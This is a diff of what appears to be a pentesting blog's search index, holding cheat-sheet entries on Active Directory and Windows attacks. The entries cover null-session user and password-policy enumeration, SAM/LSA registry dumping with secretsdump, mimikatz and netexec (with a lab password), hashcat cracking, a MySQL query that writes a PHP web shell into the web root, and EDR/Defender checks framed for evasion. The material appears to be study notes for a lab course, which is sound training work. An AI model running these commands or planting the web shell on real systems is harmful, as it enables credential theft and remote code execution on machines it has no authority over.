-<h4 id="PowerView"><a href="#PowerView" class="headerlink" title="PowerView"></a>PowerView</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">import-module</span> .\PowerView.ps1</span><br><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Get-DomainPolicy</span></span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Enumeration</category>
-        <category>Users &amp; Passwords Enumeration</category>
-        <category>Enumerating &amp; Retrieving Password Policies</category>
-      </categories>
-      <tags>
-        <tag>netexec</tag>
-        <tag>rpcclient</tag>
-        <tag>ldapsearch</tag>
-        <tag>enum4linux-ng</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Dump NTDS</title>
     <url>/2025/11/26/Dump-NTDS/</url>
     <content><![CDATA[<p>➜ Required privilege </p>
@@ -1305,6 +1272,39 @@
       </tags>
   </entry>
   <entry>
+    <title>Enumerating &amp; Retrieving Password Policies</title>
+    <url>/2025/12/03/Enumerating-Retrieving-Password-Policies/</url>
+    <content><![CDATA[<h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><h3 id="Using-Valid-Domain-Credential"><a href="#Using-Valid-Domain-Credential" class="headerlink" title="Using Valid Domain Credential"></a>Using Valid Domain Credential</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc smb dc-ip -u username -p password --pass-pol</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="Using-SMB-NULL-Sessions"><a href="#Using-SMB-NULL-Sessions" class="headerlink" title="Using SMB NULL Sessions"></a>Using SMB NULL Sessions</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc smb dc-ip -u guest -p <span class="string">&#x27;&#x27;</span> --pass-pol</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rpcclient $&gt; getdompwinfo</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">enum4linux-ng -P dc-ip</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Step 1: Get Base DN</span></span><br><span class="line"></span><br><span class="line">ldapsearch -x -H ldap://&lt;DC_IP&gt; -s base namingcontexts</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 2: Use Base DN to retrieve password policy attributes</span></span><br><span class="line"></span><br><span class="line">ldapsearch -x -H ldap://&lt;DC_IP&gt; -b <span class="string">&quot;&lt;BASE_DN&gt;&quot;</span> -s sub <span class="string">&quot;*&quot;</span> | grep -m 1 -B 10 pwdHistoryLength</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h1><h3 id="Using-SMB-NULL-Sessions-1"><a href="#Using-SMB-NULL-Sessions-1" class="headerlink" title="Using SMB NULL Sessions"></a>Using SMB NULL Sessions</h3><h4 id="net-exe-Built-in-Tool"><a href="#net-exe-Built-in-Tool" class="headerlink" title="net.exe : Built-in Tool"></a>net.exe : Built-in Tool</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\htb&gt; net accounts</span><br></pre></td></tr></table></figure>
+
+<h4 id="PowerView"><a href="#PowerView" class="headerlink" title="PowerView"></a>PowerView</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">import-module</span> .\PowerView.ps1</span><br><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Get-DomainPolicy</span></span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Enumeration</category>
+        <category>Users &amp; Passwords Enumeration</category>
+        <category>Enumerating &amp; Retrieving Password Policies</category>
+      </categories>
+      <tags>
+        <tag>netexec</tag>
+        <tag>rpcclient</tag>
+        <tag>ldapsearch</tag>
+        <tag>enum4linux-ng</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Event Log Readers</title>
     <url>/2026/03/06/Event-Log-Readers/</url>
     <content><![CDATA[<blockquote>
@@ -1332,45 +1332,6 @@
       </categories>
       <tags>
         <tag>wevtutil</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Extracting Passwords from Windows Registry.</title>
-    <url>/2025/11/25/Extracting-Passwords-from-Windows-Systems/</url>
-    <content><![CDATA[<h2 id="Dump-SAM-SYSTEM-And-SECURITY"><a href="#Dump-SAM-SYSTEM-And-SECURITY" class="headerlink" title="Dump SAM, SYSTEM, And SECURITY"></a>Dump SAM, SYSTEM, And SECURITY</h2><h3 id="Offline"><a href="#Offline" class="headerlink" title="Offline"></a>Offline</h3><h4 id="Copy-Registry"><a href="#Copy-Registry" class="headerlink" title="Copy Registry"></a>Copy Registry</h4><p>Key Registry Hives:</p>
-<ul>
-<li><p>HKLM\SAM - Contains local user password hashes</p>
-</li>
-<li><p>HKLM\SYSTEM - Contains boot key to decrypt SAM</p>
-</li>
-<li><p>HKLM\SECURITY - Contains cached domain credentials &amp; LSA secrets</p>
-</li>
-</ul>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">C:\WINDOWS\system32&gt; reg.exe save hklm\sam C:\sam.save</span><br><span class="line"></span><br><span class="line">C:\WINDOWS\system32&gt; reg.exe save hklm\system C:\system.save</span><br><span class="line"></span><br><span class="line">C:\WINDOWS\system32&gt; reg.exe save hklm\security C:\security.save</span><br></pre></td></tr></table></figure>
-
-<h4 id="Secretsdump"><a href="#Secretsdump" class="headerlink" title="Secretsdump"></a>Secretsdump</h4><h5 id="Dump-hash"><a href="#Dump-hash" class="headerlink" title="Dump hash"></a>Dump hash</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL</span><br></pre></td></tr></table></figure>
-
-<h5 id="Crack-NT-hash"><a href="#Crack-NT-hash" class="headerlink" title="Crack NT hash"></a>Crack NT hash</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> hashcat -m 1000 hash.txt rockyou.txt</span><br></pre></td></tr></table></figure>
-
-<h5 id="Crack-DCC2-hashes"><a href="#Crack-DCC2-hashes" class="headerlink" title="Crack DCC2 hashes"></a>Crack DCC2 hashes</h5><p>➜ Local cache of a domain user’s password, used by Windows to allow login when the Domain Controller is unavailable.</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat -m 2100 <span class="built_in">hash</span> rockyou.txt</span><br></pre></td></tr></table></figure>
-
-<p>➜ This type of hash cannot be used for lateral movement with techniques like Pass-the-Hash.</p>
-<h3 id="Remotely"><a href="#Remotely" class="headerlink" title="Remotely"></a>Remotely</h3><h5 id="netexec"><a href="#netexec" class="headerlink" title="netexec"></a>netexec</h5><p>With <code>local administrator privileges</code> we can dump lsa and sam over the network.</p>
-<p>➜ Dump lsa.</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa</span><br></pre></td></tr></table></figure>
-
-<p>➜ Dump sam.</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam</span><br></pre></td></tr></table></figure>
-<h3 id="Locally"><a href="#Locally" class="headerlink" title="Locally"></a>Locally</h3><h5 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mimikatz.exe</span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># privilege::debug</span></span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># lsadump::sam</span></span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Windows</category>
-        <category>Post-Exploitation</category>
-        <category>Dump-Passwords</category>
-      </categories>
-      <tags>
-        <tag>Dump-SAM</tag>
       </tags>
   </entry>
   <entry>
@@ -1451,9 +1412,43 @@
       </tags>
   </entry>
   <entry>
-    <title>Initial Enumeration</title>
-    <url>/2026/06/29/Initial-Enumeration/</url>
-    <content><![CDATA[]]></content>
+    <title>Extracting Passwords from Windows Registry.</title>
+    <url>/2025/11/25/Extracting-Passwords-from-Windows-Systems/</url>
+    <content><![CDATA[<h2 id="Dump-SAM-SYSTEM-And-SECURITY"><a href="#Dump-SAM-SYSTEM-And-SECURITY" class="headerlink" title="Dump SAM, SYSTEM, And SECURITY"></a>Dump SAM, SYSTEM, And SECURITY</h2><h3 id="Offline"><a href="#Offline" class="headerlink" title="Offline"></a>Offline</h3><h4 id="Copy-Registry"><a href="#Copy-Registry" class="headerlink" title="Copy Registry"></a>Copy Registry</h4><p>Key Registry Hives:</p>
+<ul>
+<li><p>HKLM\SAM - Contains local user password hashes</p>
+</li>
+<li><p>HKLM\SYSTEM - Contains boot key to decrypt SAM</p>
+</li>
+<li><p>HKLM\SECURITY - Contains cached domain credentials &amp; LSA secrets</p>
+</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">C:\WINDOWS\system32&gt; reg.exe save hklm\sam C:\sam.save</span><br><span class="line"></span><br><span class="line">C:\WINDOWS\system32&gt; reg.exe save hklm\system C:\system.save</span><br><span class="line"></span><br><span class="line">C:\WINDOWS\system32&gt; reg.exe save hklm\security C:\security.save</span><br></pre></td></tr></table></figure>
+
+<h4 id="Secretsdump"><a href="#Secretsdump" class="headerlink" title="Secretsdump"></a>Secretsdump</h4><h5 id="Dump-hash"><a href="#Dump-hash" class="headerlink" title="Dump hash"></a>Dump hash</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL</span><br></pre></td></tr></table></figure>
+
+<h5 id="Crack-NT-hash"><a href="#Crack-NT-hash" class="headerlink" title="Crack NT hash"></a>Crack NT hash</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> hashcat -m 1000 hash.txt rockyou.txt</span><br></pre></td></tr></table></figure>
+
+<h5 id="Crack-DCC2-hashes"><a href="#Crack-DCC2-hashes" class="headerlink" title="Crack DCC2 hashes"></a>Crack DCC2 hashes</h5><p>➜ Local cache of a domain user’s password, used by Windows to allow login when the Domain Controller is unavailable.</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat -m 2100 <span class="built_in">hash</span> rockyou.txt</span><br></pre></td></tr></table></figure>
+
+<p>➜ This type of hash cannot be used for lateral movement with techniques like Pass-the-Hash.</p>
+<h3 id="Remotely"><a href="#Remotely" class="headerlink" title="Remotely"></a>Remotely</h3><h5 id="netexec"><a href="#netexec" class="headerlink" title="netexec"></a>netexec</h5><p>With <code>local administrator privileges</code> we can dump lsa and sam over the network.</p>
+<p>➜ Dump lsa.</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa</span><br></pre></td></tr></table></figure>
+
+<p>➜ Dump sam.</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam</span><br></pre></td></tr></table></figure>
+<h3 id="Locally"><a href="#Locally" class="headerlink" title="Locally"></a>Locally</h3><h5 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mimikatz.exe</span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># privilege::debug</span></span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># lsadump::sam</span></span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Windows</category>
+        <category>Post-Exploitation</category>
+        <category>Dump-Passwords</category>
+      </categories>
+      <tags>
+        <tag>Dump-SAM</tag>
+      </tags>
   </entry>
   <entry>
     <title>Hyper-V Administrators</title>
@@ -1497,6 +1492,11 @@
         <category>Windows Privesc</category>
         <category>Groups</category>
       </categories>
+  </entry>
+  <entry>
+    <title>Initial Enumeration</title>
+    <url>/2026/06/29/Initial-Enumeration/</url>
+    <content><![CDATA[]]></content>
   </entry>
   <entry>
     <title>Kerberoasting &amp; ASREPRoasting</title>
@@ -1692,42 +1692,6 @@
         <tag>evil-winrm</tag>
         <tag>impacket-psexec</tag>
         <tag>xfreerdp</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Making a Target User List</title>
-    <url>/2025/12/03/Making-a-Target-User-List/</url>
-    <content><![CDATA[<h2 id="SMB-NULL-Session"><a href="#SMB-NULL-Session" class="headerlink" title="SMB NULL Session"></a>SMB NULL Session</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kerbrute userenum --dc dc-ip -d Domain wordlist.txt</span><br></pre></td></tr></table></figure>
-
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">enum4linux -U dc-ip  | grep <span class="string">&quot;user:&quot;</span> | <span class="built_in">cut</span> -f2 -d<span class="string">&quot;[&quot;</span> | <span class="built_in">cut</span> -f1 -d<span class="string">&quot;]&quot;</span></span><br></pre></td></tr></table></figure>
-
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rpcclient -U <span class="string">&quot;&quot;</span> -N dc-ip</span><br><span class="line"></span><br><span class="line">rpcclient&gt; enumdomusers </span><br></pre></td></tr></table></figure>
-
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc smb dc-ip -u <span class="string">&#x27;&#x27;</span> -p <span class="string">&#x27;&#x27;</span> --<span class="built_in">users</span></span><br></pre></td></tr></table></figure>
-
-
-<h2 id="LDAP-Anonymous"><a href="#LDAP-Anonymous" class="headerlink" title="LDAP Anonymous"></a>LDAP Anonymous</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Step 1: Get Base DN  </span></span><br><span class="line">  </span><br><span class="line">ldapsearch -x -H ldap://&lt;DC_IP&gt; -s base namingcontexts  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># Step 2: Use Base DN to retrieve list of users</span></span><br><span class="line"></span><br><span class="line">ldapsearch -h dc-ip -x -b <span class="string">&quot;&lt;BASE_DN&gt;&quot;</span> -s sub <span class="string">&quot;(&amp;(objectclass=user))&quot;</span>  | grep sAMAccountName: | <span class="built_in">cut</span> -f2 -d<span class="string">&quot; &quot;</span></span><br></pre></td></tr></table></figure>
-
-
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./windapsearch.py --dc-ip &lt;DC_IP&gt; -u <span class="string">&quot;&quot;</span> -U</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Enumeration</category>
-        <category>Users &amp; Passwords Enumeration</category>
-        <category>Making a Target User List</category>
-      </categories>
-      <tags>
-        <tag>netexec</tag>
-        <tag>windapsearch</tag>
-        <tag>rpcclient</tag>
-        <tag>ldapsearch</tag>
-        <tag>enum4linux-ng</tag>
       </tags>
   </entry>
   <entry>
@@ -1953,6 +1917,42 @@
       </tags>
   </entry>
   <entry>
+    <title>Making a Target User List</title>
+    <url>/2025/12/03/Making-a-Target-User-List/</url>
+    <content><![CDATA[<h2 id="SMB-NULL-Session"><a href="#SMB-NULL-Session" class="headerlink" title="SMB NULL Session"></a>SMB NULL Session</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kerbrute userenum --dc dc-ip -d Domain wordlist.txt</span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">enum4linux -U dc-ip  | grep <span class="string">&quot;user:&quot;</span> | <span class="built_in">cut</span> -f2 -d<span class="string">&quot;[&quot;</span> | <span class="built_in">cut</span> -f1 -d<span class="string">&quot;]&quot;</span></span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rpcclient -U <span class="string">&quot;&quot;</span> -N dc-ip</span><br><span class="line"></span><br><span class="line">rpcclient&gt; enumdomusers </span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc smb dc-ip -u <span class="string">&#x27;&#x27;</span> -p <span class="string">&#x27;&#x27;</span> --<span class="built_in">users</span></span><br></pre></td></tr></table></figure>
+
+
+<h2 id="LDAP-Anonymous"><a href="#LDAP-Anonymous" class="headerlink" title="LDAP Anonymous"></a>LDAP Anonymous</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Step 1: Get Base DN  </span></span><br><span class="line">  </span><br><span class="line">ldapsearch -x -H ldap://&lt;DC_IP&gt; -s base namingcontexts  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># Step 2: Use Base DN to retrieve list of users</span></span><br><span class="line"></span><br><span class="line">ldapsearch -h dc-ip -x -b <span class="string">&quot;&lt;BASE_DN&gt;&quot;</span> -s sub <span class="string">&quot;(&amp;(objectclass=user))&quot;</span>  | grep sAMAccountName: | <span class="built_in">cut</span> -f2 -d<span class="string">&quot; &quot;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./windapsearch.py --dc-ip &lt;DC_IP&gt; -u <span class="string">&quot;&quot;</span> -U</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Enumeration</category>
+        <category>Users &amp; Passwords Enumeration</category>
+        <category>Making a Target User List</category>
+      </categories>
+      <tags>
+        <tag>netexec</tag>
+        <tag>windapsearch</tag>
+        <tag>rpcclient</tag>
+        <tag>ldapsearch</tag>
+        <tag>enum4linux-ng</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Modifiable Registry Autorun &amp; Startup Binary</title>
     <url>/2026/06/19/Modifiable-Registry-Autorun-Startup-Binary/</url>
     <content><![CDATA[<blockquote>
@@ -2155,46 +2155,6 @@
       </tags>
   </entry>
   <entry>
-    <title>MySQL Exploitation</title>
-    <url>/2025/11/21/MySQL-Exploitation/</url>
-    <content><![CDATA[<h1 id="Secure-File-Privileges"><a href="#Secure-File-Privileges" class="headerlink" title="Secure File Privileges"></a>Secure File Privileges</h1><p><code>secure_file_priv</code> in <strong>MySQL</strong> controls where you can read&#x2F;write files.</p>
-<ul>
-<li><p>Only users with the <strong>FILE privilege</strong> can use <code>LOAD DATA</code>, <code>SELECT INTO OUTFILE</code>, or <code>LOAD_FILE()</code>.</p>
-</li>
-<li><p><strong>Settings: of Secure File Privileges</strong></p>
-<ul>
-<li><p><strong>Empty:</strong> No restriction (not secure).</p>
-</li>
-<li><p><strong>Directory path:</strong> Can only read&#x2F;write in that folder.</p>
-</li>
-<li><p><strong>NULL:</strong> File operations are disabled.</p>
-</li>
-</ul>
-</li>
-</ul>
-<h4 id="Example"><a href="#Example" class="headerlink" title="Example :"></a>Example :</h4><p>In the following example, the <code>secure_file_priv</code> variable is empty, which means MySQL can read and write files from <strong>any directory</strong> that the MySQL service account has permission to access.</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">show</span> variables <span class="keyword">like</span> &quot;secure_file_priv&quot;;</span><br><span class="line"></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-------+</span></span><br><span class="line"><span class="operator">|</span> Variable_name    <span class="operator">|</span> <span class="keyword">Value</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-------+</span></span><br><span class="line"><span class="operator">|</span> secure_file_priv <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-------+</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.005</span> sec)</span><br></pre></td></tr></table></figure>
-
-
-<h1 id="Read-Local-Files"><a href="#Read-Local-Files" class="headerlink" title="Read Local Files"></a>Read Local Files</h1><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> LOAD_FILE(&quot;/etc/passwd&quot;);</span><br><span class="line"></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------+</span></span><br><span class="line"><span class="operator">|</span> LOAD_FILE(&quot;/etc/passwd&quot;)</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------------------------+</span></span><br><span class="line">root:x:<span class="number">0</span>:<span class="number">0</span>:root:<span class="operator">/</span>root:<span class="operator">/</span>bin<span class="operator">/</span>bash</span><br><span class="line">daemon:x:<span class="number">1</span>:<span class="number">1</span>:daemon:<span class="operator">/</span>usr<span class="operator">/</span>sbin:<span class="operator">/</span>usr<span class="operator">/</span>sbin<span class="operator">/</span>nologin</span><br><span class="line">bin:x:<span class="number">2</span>:<span class="number">2</span>:bin:<span class="operator">/</span>bin:<span class="operator">/</span>usr<span class="operator">/</span>sbin<span class="operator">/</span>nologin</span><br><span class="line">sys:x:<span class="number">3</span>:<span class="number">3</span>:sys:<span class="operator">/</span>dev:<span class="operator">/</span>usr<span class="operator">/</span>sbin<span class="operator">/</span>nologin</span><br><span class="line">sync:x:<span class="number">4</span>:<span class="number">65534</span>:sync:<span class="operator">/</span>bin:<span class="operator">/</span>bin<span class="operator">/</span>sync</span><br><span class="line"></span><br><span class="line"><span class="operator">&lt;</span>SNIP<span class="operator">&gt;</span></span><br></pre></td></tr></table></figure>
-
-
-<h1 id="MySQL-Write-File"><a href="#MySQL-Write-File" class="headerlink" title="MySQL - Write File"></a>MySQL - Write File</h1><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> &quot;&lt;?php echo shell_exec($_GET[&#x27;c&#x27;]);?&gt;&quot; <span class="keyword">INTO</span> OUTFILE <span class="string">&#x27;/var/www/html/webshell.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">Query OK, <span class="number">1</span> <span class="type">row</span> affected (<span class="number">0.001</span> sec)</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Service-Exploitation</category>
-        <category>MySQL</category>
-      </categories>
-      <tags>
-        <tag>MySQL</tag>
-        <tag>Exploitation</tag>
-        <tag>MySQL-Read-Files</tag>
-        <tag>MySQL-Write-Files</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>MySQL Enumeration</title>
     <url>/2025/11/21/MySQL-Enumeration/</url>
     <content><![CDATA[<h1 id="Connect-To-The-Server"><a href="#Connect-To-The-Server" class="headerlink" title="Connect To The Server"></a>Connect To The Server</h1><h3 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql -u username -p&lt;password&gt; -h target</span><br></pre></td></tr></table></figure>
@@ -2233,6 +2193,46 @@
       <tags>
         <tag>Enumeration</tag>
         <tag>MySQL</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>MySQL Exploitation</title>
+    <url>/2025/11/21/MySQL-Exploitation/</url>
+    <content><![CDATA[<h1 id="Secure-File-Privileges"><a href="#Secure-File-Privileges" class="headerlink" title="Secure File Privileges"></a>Secure File Privileges</h1><p><code>secure_file_priv</code> in <strong>MySQL</strong> controls where you can read&#x2F;write files.</p>
+<ul>
+<li><p>Only users with the <strong>FILE privilege</strong> can use <code>LOAD DATA</code>, <code>SELECT INTO OUTFILE</code>, or <code>LOAD_FILE()</code>.</p>
+</li>
+<li><p><strong>Settings: of Secure File Privileges</strong></p>
+<ul>
+<li><p><strong>Empty:</strong> No restriction (not secure).</p>
+</li>
+<li><p><strong>Directory path:</strong> Can only read&#x2F;write in that folder.</p>
+</li>
+<li><p><strong>NULL:</strong> File operations are disabled.</p>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="Example"><a href="#Example" class="headerlink" title="Example :"></a>Example :</h4><p>In the following example, the <code>secure_file_priv</code> variable is empty, which means MySQL can read and write files from <strong>any directory</strong> that the MySQL service account has permission to access.</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">show</span> variables <span class="keyword">like</span> &quot;secure_file_priv&quot;;</span><br><span class="line"></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-------+</span></span><br><span class="line"><span class="operator">|</span> Variable_name    <span class="operator">|</span> <span class="keyword">Value</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-------+</span></span><br><span class="line"><span class="operator">|</span> secure_file_priv <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-------+</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.005</span> sec)</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="Read-Local-Files"><a href="#Read-Local-Files" class="headerlink" title="Read Local Files"></a>Read Local Files</h1><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> LOAD_FILE(&quot;/etc/passwd&quot;);</span><br><span class="line"></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------+</span></span><br><span class="line"><span class="operator">|</span> LOAD_FILE(&quot;/etc/passwd&quot;)</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------------------------+</span></span><br><span class="line">root:x:<span class="number">0</span>:<span class="number">0</span>:root:<span class="operator">/</span>root:<span class="operator">/</span>bin<span class="operator">/</span>bash</span><br><span class="line">daemon:x:<span class="number">1</span>:<span class="number">1</span>:daemon:<span class="operator">/</span>usr<span class="operator">/</span>sbin:<span class="operator">/</span>usr<span class="operator">/</span>sbin<span class="operator">/</span>nologin</span><br><span class="line">bin:x:<span class="number">2</span>:<span class="number">2</span>:bin:<span class="operator">/</span>bin:<span class="operator">/</span>usr<span class="operator">/</span>sbin<span class="operator">/</span>nologin</span><br><span class="line">sys:x:<span class="number">3</span>:<span class="number">3</span>:sys:<span class="operator">/</span>dev:<span class="operator">/</span>usr<span class="operator">/</span>sbin<span class="operator">/</span>nologin</span><br><span class="line">sync:x:<span class="number">4</span>:<span class="number">65534</span>:sync:<span class="operator">/</span>bin:<span class="operator">/</span>bin<span class="operator">/</span>sync</span><br><span class="line"></span><br><span class="line"><span class="operator">&lt;</span>SNIP<span class="operator">&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<h1 id="MySQL-Write-File"><a href="#MySQL-Write-File" class="headerlink" title="MySQL - Write File"></a>MySQL - Write File</h1><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> &quot;&lt;?php echo shell_exec($_GET[&#x27;c&#x27;]);?&gt;&quot; <span class="keyword">INTO</span> OUTFILE <span class="string">&#x27;/var/www/html/webshell.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">Query OK, <span class="number">1</span> <span class="type">row</span> affected (<span class="number">0.001</span> sec)</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Service-Exploitation</category>
+        <category>MySQL</category>
+      </categories>
+      <tags>
+        <tag>MySQL</tag>
+        <tag>Exploitation</tag>
+        <tag>MySQL-Read-Files</tag>
+        <tag>MySQL-Write-Files</tag>
       </tags>
   </entry>
   <entry>
@@ -2374,7 +2374,6 @@
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">proxychains4 -q smbexec.py &lt;domain&gt;/&lt;user&gt;@&lt;target_ip&gt; -no-pass</span><br></pre></td></tr></table></figure>]]></content>
       <categories>
         <category>Active Directory</category>
-        <category>Windows</category>
         <category>Exploitation</category>
         <category>NTLM Relay</category>
       </categories>
@@ -3510,6 +3509,92 @@
       </tags>
   </entry>
   <entry>
+    <title>Protections Enumeration</title>
+    <url>/2026/06/09/Protections-Enumeration/</url>
+    <content><![CDATA[<h3 id="Checking-Windows-Defender-status"><a href="#Checking-Windows-Defender-status" class="headerlink" title="Checking Windows Defender status"></a>Checking Windows Defender status</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span>&gt; <span class="built_in">Get-MpComputerStatus</span></span><br><span class="line"></span><br><span class="line">AMServiceEnabled        : True</span><br><span class="line">AntivirusEnabled        : True</span><br><span class="line">RealTimeProtectionEnabled : False   &lt;<span class="literal">--</span> Disabled! Safe to use standard tools</span><br><span class="line">BehaviorMonitorEnabled  : False</span><br><span class="line">IoavProtectionEnabled   : False</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<ul>
+<li><code>RealTimeProtectionEnabled: False</code> → Defender scanning is off, use tools normally</li>
+<li><code>RealTimeProtectionEnabled: True</code> → need obfuscated or in-memory techniques</li>
+<li><code>BehaviorMonitorEnabled</code> → catches Potato-style attacks even when signature scanning is bypassed</li>
+</ul>
+</blockquote>
+<h3 id="Identifying-third-party-EDR-products"><a href="#Identifying-third-party-EDR-products" class="headerlink" title="Identifying third-party EDR products"></a>Identifying third-party EDR products</h3><blockquote>
+<p>Enterprise environments almost always have an EDR beyond basic Defender :</p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th>EDR Product</th>
+<th>Process to look for</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>CrowdStrike Falcon</td>
+<td>CSFalconService.exe</td>
+</tr>
+<tr>
+<td>Carbon Black</td>
+<td>cb.exe, CarbonBlack.exe</td>
+</tr>
+<tr>
+<td>Cylance</td>
